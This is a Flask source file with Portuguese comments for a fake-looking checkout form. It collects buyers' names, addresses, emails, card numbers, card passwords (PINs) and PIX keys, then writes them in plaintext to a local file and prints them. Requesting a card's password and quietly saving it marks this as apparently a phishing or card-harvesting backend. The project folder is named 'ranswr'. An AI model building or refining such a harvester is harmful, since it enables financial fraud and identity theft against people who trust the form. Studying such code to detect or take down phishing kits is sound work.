import os
from flask import Flask, request, render_template, redirect
import secrets

app = Flask(__name__)

# Chave secreta
app.secret_key = secrets.token_hex(16)

# Caminho para salvar os dados no diretório desejado
diretorio = 'C:/Users/Júlio César/Documents/Projects/Ferramentas/ranswr/arquivos'
arquivo_path = os.path.join(diretorio, "dados_pedidos.txt")

# Função para salvar dados em um arquivo .txt
def salvar_dados_em_txt(dados):
    # Certifique-se de que o diretório existe
    if not os.path.exists(diretorio):
        os.makedirs(diretorio)  # Cria o diretório caso não exista

    # Salvando os dados no arquivo .txt
    with open(arquivo_path, "a") as f:  # "a" para adicionar novas linhas sem sobrescrever
        f.write(dados + "\n")

@app.route('/', methods=['GET', 'POST'])
def purchase():
    if request.method == 'POST':
        # Coletando os dados do formulário
        payment_method = request.form['payment-method']
        name = request.form['name']
        email = request.form['email']
        country = request.form['country']
        state = request.form['state']
        city = request.form['city']
        municipality = request.form['municipality']
        residence = request.form['residence']
        product_url = request.form['product-url']

        card_number = request.form.get('card-number')
        card_password = request.form.get('card-password')
        pix_key = request.form.get('pix-key')
        boleto = request.form.get('boleto')

        # Montando os dados para salvar
        dados = f"Nome: {name}, E-mail: {email}, País: {country}, Estado: {state}, Cidade: {city}, Município: {municipality}, Residência: {residence}, Produto: {product_url}, Método de Pagamento: {payment_method}"

        if payment_method == 'cartao':
            dados += f", Número do Cartão: {card_number}, Senha do Cartão: {card_password}"
        elif payment_method == 'pix':
            dados += f", Chave PIX: {pix_key}"
        elif payment_method == 'boleto':
            dados += ", Boleto gerado"

        # Salvando os dados no arquivo .txt
        salvar_dados_em_txt(dados)

        # Exibir os dados no console (opcional)
        print(dados)

        return redirect('/')

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)